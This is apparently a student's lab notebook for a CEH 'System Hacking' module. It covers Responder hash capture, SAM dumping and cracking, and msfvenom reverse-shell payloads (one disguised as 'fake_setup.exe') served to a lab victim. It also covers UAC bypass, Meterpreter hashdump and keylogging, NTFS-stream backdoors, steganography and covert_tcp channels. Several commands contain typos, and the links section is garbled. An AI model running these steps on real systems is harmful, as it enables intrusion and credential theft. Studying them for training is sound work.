# 6 - System Hacking

#### <mark style="color:yellow;">**Module 06 - System Hacking**</mark>

## Finding FQDN <a href="#effd" id="effd"></a>

**FQDN** stands for Fully Qualified Domain Name. It is a complete and unambiguous domain name that specifies a host's exact location in the Domain Name System (DNS) hierarchy. An FQDN includes both the host's hostname and its domain name, providing a full and unique address for a specific resource on the internet.

FQDN (**FQDN = Hostname + Domain**) an example can be: mail.example.com mail (hostname), example.com (domain).

In windows, if we go into advanced system settings and system properties, we've full computer name and workgroup name, if we've workgroup name it means that we've not a centralized Domain Controller, then the full computer name consists of just the computer name without domain name.

While, in another scenario, if we see System control panel, at computer name, domain and worgroup settings we see a more long full computer name because we've Domain Controller associated.

### Find FQDN of domain controller using Nmap <a href="#effd" id="effd"></a>

We can find FQDN using nmap of domain controller in a subnet

* `nmap -p389 -sV -iL <target_list>` -> if we've more targets IP

or

* `nmap -p389 -sV <target_IP>`

port 389 regarding LDAP service: protocol used for accessing and maintaining directory info such as user account within a network. We can associated it functionality as a phonebook or address book that helps you to search, retrieve and update info in that directory.&#x20;

Running nmap command we'll retrieve info about Domain and Host name:

* Domain: pentester.team Service Info: Host: DC;
* then FQDN = DC.pentester.team

## Dump and Crack SAM (Security Account Manager) hashes

Windows stores passwords in LM and NTLM hash format | NTLM New Technology LAN Manager.

Need admin access to dump SAM.

## WMIC (Windows Management Instrumentation Command) CLI to get info about local system&#x20;

```bash
wmic useraccount get name,sid | displays usernames and their SIDs
```

## LLMNR / NBT-NS Spoofing

[Responder](https://github.com/lgandx/Responder) : rogue authentication server to capture hashes

This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present [Step by Step](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)

```
# In Parrot/Kali OS, 
responder -I eth0

# In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
# To crack that hash, use JohntheRipper
john SMB<filename>
```

## **NTLM Hash crack**

* esponder -I eth0
* usr\share\responder\logs --> Responder log location
* john /usr/share/responder/logs/ntlm.txt

## **Rainbow table crack using Winrtgen**

* Open winrtgen and add new table
* Select ntlm from Hash dropdown list.
* Set Min Len as 4, Max Len as 6 and Chain Count 4000000
* Select loweralpha from Charset dropdown list (it depends upon Password).
* rcrack\_gui.exe to crack hash with rainbow table

## **Hash dump with Pwdump7 and crack with Ophcrack**

### Pwdump7 (To dump password hashes)

* pwdump7.exe -d c:\lockedfile.dat backup-lockedfile.dat |dump protected file
* Browse admin terminal to pwdump7 path and run pwdump.exe in cmd -> shows password hashes
* PwDump7.exe > c:\hashes.txt -> export hashes to path defined
* In text file replace boxes with account names obtained from WMIC. The last code numbers will be the identity. And Save the file

{% embed url="https://www.tarasco.org/security/pwdump_7/pwdump7.zip" %}
pwDump7.exe : To Dump Windows Hashes
{% endembed %}

## Ophcrack (To crack password hashes)

To crack passwords not longer than 14 characters using only alphanumeric characters

* Open /x86 gui version. Load PWDUMP and select the hashes.txt file.
* Select Table Vista Free. Install it from location where ophcrack files are placed.
* Click Crack to start cracking
* Copy the Hashes.txt to shared drive for future labs.

{% embed url="https://ophcrack.sourceforge.io/download.php?type=ophcrack" %}
Ophcrack.exe : To Crack SAM Hashes to obtain clear password
{% endembed %}

### Winrtgen – Create Rainbow table

* Click on add table
* Select hash NTLM, min length 4, max length 6, Chain Count 4000000, Charset Loweralpha
* Click OK on main window to start , table is saved in Winrtgen folder.

### Rainbow Crack

* Open rcrack\_gui.exe
* Click File, then select Load NTLM hashes from PWDUMP
* Open Hashes.txt saved from before Now click Rainbow Table -> Select Rainbow table -> Select table created by winrtgen -> crack process automatically starts

Or

* `wmic useraccount get name,sid` --> Get user acc names and SID
* PwDump7.exe > c:\hashes.txt&#x20;
* Replace boxes in hashes.txt with relevant usernames from step 1.
* Ophcrack.exe -> load -> PWDUMP File
* Tables -> Vista free -> select the table directory -> crack

{% embed url="http://project-rainbowcrack.com/" %}
rcrack\_gui.exe : Use Raindow Table to crack hashes
{% endembed %}

## **Perform Active Online Attack to Crack the System's Password using Responder**

#### **Linux:**

* cd
* cd Responder
* chmox +x ./Responder.py
* **sudo ./Responder.py -I eth0**
* passwd: \*\*\*\*

#### **Windows**

* run
* \CEH-Tools

#### **Linux:**

* Home/Responder/logs/SMB-NTMLv2-SSP-**\<Target IP>**txt
* sudo snap install john-the-ripper
* passwd: \*\*\*\*
* **sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt**

## Establish VNC connection to target machine using MSFVENOM and MSFCONSLE

#### Payload setup&#x20;

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe
LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe #-p payload, --platform platform of the target, -a architecture, -f output format, -o save the output path
mkdir /var/www/html/share #make directory
chmod -R 755 /var/www/html/share #change rights recursively to all files and foldersinside
chown -R www-data:www-data /var/www/html/share #change owner recursively owner:group
mv /root/Desktop/Test.exe /var/www/html/share #move the exploit
service apache2 start
```

#### Listener Setup

```bash
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.11
set LPORT 444
Run
```

#### Execute Exploit

* Open `http://10.10.10.11/share` on victim machine.
* Download Payload and run. Meterpreter shell is opened on attacker side. Type `sysinfo` to get system details.
* Type `run vnc` to start vnc viewer.

## Create a Reverse TCP Connection

```bash
# creates reverse TCP from windows  machine, send this file to victim machine via python-Webserver/shared resource
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<attacker_IP> LPORT=444 -o fake_setup.exe  ↵

msfdb init && msfconsole
use exploit/multi/handler
set LHOST=<attacker-IP>
set LPORT=444
  run
```

## Privilege Escalation using MSFVenom and MSFConsole

#### Payload Setup

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e
x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe #-e encoder, -b list of bad characters to avoid
mkdir /var/www/html/share #make directory
chmod -R 755 /var/www/html/share #change rights recursively to all files and folders inside
chown -R www-data:www-data /var/www/html/share #change owner recursively owner:group
mv /root/Desktop/Test.exe /var/www/html/share #move to exploit
service apache2 start
```

#### Listener Setup

```bash
#Open http://10.10.10.11/share on victim machine. Download Payload and run.
sessions -i #to view sessions
sessions -i 1 #to interact with the session created
getuid to #get user id
#Run post exploitation exploit
run post/windows/gather/smart_hashdump #will fail right now
getsystem | will fail right now #use getystem -h to view all available methods
getsystem -t 1 #use technique 1 to escalate privileges | will fail right now
background #backgrounds the meterpreter session.
search uac in msfconsole #get view modules related to uac
```

#### Run Exploit

```bash
use exploit/windows/local/bypassuac_fodhelper
show options #to view options related to the payload
set SESSION 1 #the previous opened meterpreter session id
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.11
set TARGET 0
exploit
getuid to get user id
etsystem #to escalate privileges
Run post exploitation exploit run post/windows/gather/smart_hashdump #to dump password
hashes
```

## Post Exploitation Activities on Target

After meterpreter is successfully running, try these commands:

```bash
sysinfo
ipconfig
getuid
pwd
ls
cat secret.txt
timestomp secret.txt -v #view modified, accessed, created time of file
cd c:\ #then pwd, ls
download bootmgr #downloads the bootmgr file from c:\ to home directory of kali
search -f “filename.ext” |here “pagefile.sys” #displays complete path of file
keyscan_start #to start keylogger
keyscan_dump #to dump keylogger results
idletime #shows the time the target user has been away from keyboard
shutdown #shutdown the victim machine
```

## Hiding file in NTFS stream

The NTFS file system includes support for alternate data streams. A file stream is a sequence of bytes that contains data about a file, such as keywords or the identity of the user who created the file. Think of a data stream as a file within a file — a hidden file residing within a legitimate one. Each stream has its own disk space allocation, its own actual size (bytes in use) and its own file locks.

* Copy calc.exe from system32 dir.
* Make c:\magic folder.
* Copy calc.exe inside it, and create a text file readme.txt
* Type `c:\magic\calc.exe > c:\magic\readme.txt:calc.exe`
* Type `mklink backdoor.exe readme.txt:calc.exe` -> create a link to the ADS file to create backdoor
* Execute backdoor.exe

## Hiding Data Using White Space Steganography

* Create a text file readme.txt like this below

<div align="left">

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption><p>readme.txt</p></figcaption></figure>

</div>

* Copy it inside the SNOW folder
* Open cmd in the folder
* Type `snow -C -m "Secret message" -p "password" <original file name>` -C compression, -m message string, -p password Hide method Type snow -C -p "password"
* Type `snow -C -p "password" <file name to unhide data>`

## Image Steganography

**Image Steganography** is the process of hiding information which can be text, image or video inside a cover image. The secret information is hidden in a way that it not visible to the human eyes.

### OpenStego

#### Hide Data

* Select text message file which you want to hide
* Select the cover file image where data is to be hidden
* Set output path and file name
* Set password if needed
* Click Hide Data

#### Extract Data

* Select the stegno file
* Set the Output folder path
* Give the password
* Click Extract Data

{% content-ref url="../tools/openstego.md" %}
[openstego.md](../tools/openstego.md)
{% endcontent-ref %}

### QuickStego

#### Hide Data

* Select the open image option to browse the image where data is to be hidden
* Select the open text option to browse the text file which you want to hide
* Click Hide Text to embed text in image
* Click Save Image to output the result image

#### Extract Data

* Select the open image option to open the modified image
* Hidden text will be displayed in right side bar

{% content-ref url="../tools/quickstego.md" %}
[quickstego.md](../tools/quickstego.md)
{% endcontent-ref %}

### Steganographic Decoder

**Online steganography tool**

{% embed url="https://futureboy.us/stegano/decinput.html" %}

## **Covert Channels using Covert\_TCP**

Hiding traffic in IP4 headers to avoid detection.

We need to download and compile the tool on both machine (attacker and target):

```bash
wget https://raw.githubusercontent.com/cudeso/security‐ tools/master/networktools/covert/covert_tcp.c
sudo apt install gcc
cc ‐o covert_tcp covert_tcp.c
```

#### **Attacker:**

* cd Desktop
* mkdir Send
* cd Send
* echo "Secret"->message.txt
* Place->Network
* Ctrl+L
* **smb://\<Target IP>**
* Account & Password
* copy and paste covert\_tcp.c
* `cc -o covert_tcp covert_tcp.c` **-**> Compile the Code

#### **Target:**

* **tcpdump -nvvx port 8888 -I lo**
* cd Desktop
* mkdir Receive
* cd Receive
* File -> Ctrl+L
* smb://**\<Target IP>**
* copy and paste covert\_tcp.c
* cc -o covert\_tcp covert\_tcp.c
* `./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt`
* **Tcpdump captures no packets**

#### **Attacker**

* `./covert_tcp -dest 10.10.10.9 -source 10.10.10.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/send/message.txt` -**>** # Create A Message file that need to be transferred
* Wireshark (message string being send in individual packet)

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption><p>Wireshark</p></figcaption></figure>

## Additional Resources

### Start Python webserver

`python3 -m http.server 4443`

### Perform HTTP Request

curl http://\<Target\_IP>:4443/?foo=bar

Useful curl options:

> \-k: Accept untrusted certificates
>
> \-d “foo=bar”: HTTP POST data
>
> \-H: “Foo: Bar”: HTTP header
>
> \-I: Perform HEAD request
>
> \-L: Follow redirects
>
> \-o foobar.html: Write output file
>
> \--proxy http://127.0.0.1:8080: Set proxy

### Download file from FTP

* `wget -m ftp://anonymous:anonymous@`

or

* `wget -m --no-passive ftp://anonymous:anonymous@`

### System Hacking

{% embed url="https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/" %}

{% embed url="https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/" %}

{% embed url="https://blog.rapid7.com/2017/03/21/combining-responder-and-psexec-for-internal-penetration-tests/" %}

{% embed url="https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/" %}

{% embed url="https://medium.com/@hninja049/how-to-easy-find-exploits-with-searchsploit-on-linux-4ce0b82c82fd" %}

{% embed url="https://www.offensive-security.com/offsec/edb-searchsploit-update-2020/" %}



{% embed url="https://www.hackingloops.com/maintaining-access-metasploit/" %}

{% embed url="https://resources.infosecinstitute.com/information-gathering-using-metasploit/" %}

{% embed url="https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/" %}

{% embed url="https://attack.mitre.org/techniques/T1557/001/" %}

{% embed url="https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning" %}

{% embed url="https://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7bef" %}

{% embed url="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" %}

[https://www.youtube.com/watch?v=joT8NxlXxVY](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/https://blog.rapid7.com/2017/03/21/combining-responder-and-psexec-for-internal-penetration-tests/https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/https://medium.com/@hninja049/how-to-easy-find-exploits-with-searchsploit-on-linux-4ce0b82c82fdhttps://www.offensive-security.com/offsec/edb-searchsploit-update-2020/https://www.youtube.com/watch?v=29GlfaH5qCMhttps://www.hackingloops.com/maintaining-access-metasploit/https://resources.infosecinstitute.com/information-gathering-using-metasploit/https://www.youtube.com/watch?v=s6rwS7UuMt8https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/https://www.youtube.com/watch?v=joT8NxlXxVYhttps://attack.mitre.org/techniques/T1557/001/https://www.youtube.com/watch?v=0TBCzaBklcEhttps://www.youtube.com/watch?v=FfoQFKhWUr0https://www.youtube.com/watch?v=Fg2gvk0qgjMhttps://www.youtube.com/watch?v=rjRDsXp\_MNkhttps://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoninghttps://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7befhttps://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)

[https://www.youtube.com/watch?v=29GlfaH5qCM](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/https://blog.rapid7.com/2017/03/21/combining-responder-and-psexec-for-internal-penetration-tests/https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/https://medium.com/@hninja049/how-to-easy-find-exploits-with-searchsploit-on-linux-4ce0b82c82fdhttps://www.offensive-security.com/offsec/edb-searchsploit-update-2020/https://www.youtube.com/watch?v=29GlfaH5qCMhttps://www.hackingloops.com/maintaining-access-metasploit/https://resources.infosecinstitute.com/information-gathering-using-metasploit/https://www.youtube.com/watch?v=s6rwS7UuMt8https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/https://www.youtube.com/watch?v=joT8NxlXxVYhttps://attack.mitre.org/techniques/T1557/001/https://www.youtube.com/watch?v=0TBCzaBklcEhttps://www.youtube.com/watch?v=FfoQFKhWUr0https://www.youtube.com/watch?v=Fg2gvk0qgjMhttps://www.youtube.com/watch?v=rjRDsXp\_MNkhttps://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoninghttps://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7befhttps://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)[\
\
](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/https://blog.rapid7.com/2017/03/21/combining-responder-and-psexec-for-internal-penetration-tests/https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/https://medium.com/@hninja049/how-to-easy-find-exploits-with-searchsploit-on-linux-4ce0b82c82fdhttps://www.offensive-security.com/offsec/edb-searchsploit-update-2020/https://www.youtube.com/watch?v=29GlfaH5qCMhttps://www.hackingloops.com/maintaining-access-metasploit/https://resources.infosecinstitute.com/information-gathering-using-metasploit/https://www.youtube.com/watch?v=s6rwS7UuMt8https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/https://www.youtube.com/watch?v=joT8NxlXxVYhttps://attack.mitre.org/techniques/T1557/001/https://www.youtube.com/watch?v=0TBCzaBklcEhttps://www.youtube.com/watch?v=FfoQFKhWUr0https://www.youtube.com/watch?v=Fg2gvk0qgjMhttps://www.youtube.com/watch?v=rjRDsXp\_MNkhttps://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoninghttps://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7befhttps://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)[https://www.youtube.com/watch?v=s6rwS7UuMt8](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/https://blog.rapid7.com/2017/03/21/combining-responder-and-psexec-for-internal-penetration-tests/https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/https://medium.com/@hninja049/how-to-easy-find-exploits-with-searchsploit-on-linux-4ce0b82c82fdhttps://www.offensive-security.com/offsec/edb-searchsploit-update-2020/https://www.youtube.com/watch?v=29GlfaH5qCMhttps://www.hackingloops.com/maintaining-access-metasploit/https://resources.infosecinstitute.com/information-gathering-using-metasploit/https://www.youtube.com/watch?v=s6rwS7UuMt8https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/https://www.youtube.com/watch?v=joT8NxlXxVYhttps://attack.mitre.org/techniques/T1557/001/https://www.youtube.com/watch?v=0TBCzaBklcEhttps://www.youtube.com/watch?v=FfoQFKhWUr0https://www.youtube.com/watch?v=Fg2gvk0qgjMhttps://www.youtube.com/watch?v=rjRDsXp\_MNkhttps://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoninghttps://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7befhttps://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)[\
\
https://www.youtube.com/watch?v=0TBCzaBklcE\
\
https://www.youtube.com/watch?v=FfoQFKhWUr0\
\
https://www.youtube.com/watch?v=Fg2gvk0qgjM\
\
https://www.youtube.com/watch?v=rjRDsXp\_MNk](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/https://blog.rapid7.com/2017/03/21/combining-responder-and-psexec-for-internal-penetration-tests/https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/https://medium.com/@hninja049/how-to-easy-find-exploits-with-searchsploit-on-linux-4ce0b82c82fdhttps://www.offensive-security.com/offsec/edb-searchsploit-update-2020/https://www.youtube.com/watch?v=29GlfaH5qCMhttps://www.hackingloops.com/maintaining-access-metasploit/https://resources.infosecinstitute.com/information-gathering-using-metasploit/https://www.youtube.com/watch?v=s6rwS7UuMt8https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/https://www.youtube.com/watch?v=joT8NxlXxVYhttps://attack.mitre.org/techniques/T1557/001/https://www.youtube.com/watch?v=0TBCzaBklcEhttps://www.youtube.com/watch?v=FfoQFKhWUr0https://www.youtube.com/watch?v=Fg2gvk0qgjMhttps://www.youtube.com/watch?v=rjRDsXp\_MNkhttps://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoninghttps://medium.com/@subhammisra45/llmnr-poisoning-and-relay-5477949b7befhttps://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)&#x20;

### Steganography

{% embed url="https://resources.infosecinstitute.com/steganography-and-tools-to-perform-steganography/#gref" %}

{% embed url="https://flylib.com/books/en/1.36.1/steganography.html" %}

{% embed url="https://blog.eccouncil.org/what-is-steganography-and-what-are-its-popular-techniques/" %}

{% embed url="https://www.edureka.co/blog/steganography-tutorial" %}

{% embed url="https://www.tutorialspoint.com/image-based-steganography-using-python" %}

{% embed url="https://medium.com/@KamranSaifullah/da-vinci-stenography-challenge-solution-90122a59822" %}

{% embed url="https://medium.com/@chrisdare/steganography-in-computer-forensics-6d6e87d85c0a" %}

{% embed url="https://www.telegraph.co.uk/culture/art/art-news/8197896/Mona-Lisa-painting-contains-hidden-code.html" %}

{% embed url="https://medium.com/write-ups-hackthebox/tagged/steganography" %}

{% embed url="http://moinkhans.blogspot.com/2015/06/steghide-beginners-tutorial.html" %}

{% embed url="https://www.2daygeek.com/easy-way-hide-information-inside-image-and-sound-objects/" %}
